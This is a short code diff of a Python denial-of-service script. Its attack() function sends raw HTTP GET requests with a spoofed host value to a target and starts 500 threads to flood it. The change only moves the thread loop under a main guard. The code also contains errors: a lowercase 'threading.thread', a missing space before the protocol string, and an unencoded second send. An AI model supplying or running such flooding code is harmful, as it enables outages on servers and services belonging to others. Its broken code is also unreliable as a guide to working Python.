@@ -22,7 +22,7 @@ def attack():
     s.sendto(("GET /" + target_url + "HTTP/1.1\r\n").encode("ascii"), (target_url, port))
     s.sendto(("Host: " + fake_ip + "\r\n\r\n"), (target_url, port))
     s.close()
-
-for i in range(500):
-  thread = threading.thread(target=attack)
-  thread.start()
+if __name__ == "__main__":
+    for i in range(500):
+        thread = threading.thread(target=attack)
+        thread.start()
